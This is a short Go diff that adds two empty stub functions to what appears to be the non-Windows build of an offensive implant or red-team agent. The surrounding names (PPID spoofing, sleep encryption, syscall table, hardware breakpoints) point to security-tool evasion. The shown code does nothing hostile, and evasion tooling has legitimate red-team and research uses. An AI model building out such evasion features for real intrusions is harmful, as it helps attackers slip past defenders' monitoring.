@@ -11,6 +11,7 @@ import (
 )
 
 func initWindowsEvasion()                                             {}
+func findProcessPID(target string) uint32                              { return 0 }
 func findExplorerPID() uint32                                         { return 0 }
 func ExecuteWithPPIDSpoof(command string, ppid uint32) ([]byte, error) {
 	return runCommand(context.Background(), "sh", "-c", command)
@@ -45,6 +46,7 @@ func sleepEncrypted(duration time.Duration) {
 		copy(local, out)
 	}
 }
+func enumerateProcessNames() []string        { return nil }
 func initSyscallTable()                      {}
 func initSleepEncryption()                   {}
 func refreshHardwareBreakpoints()            {}
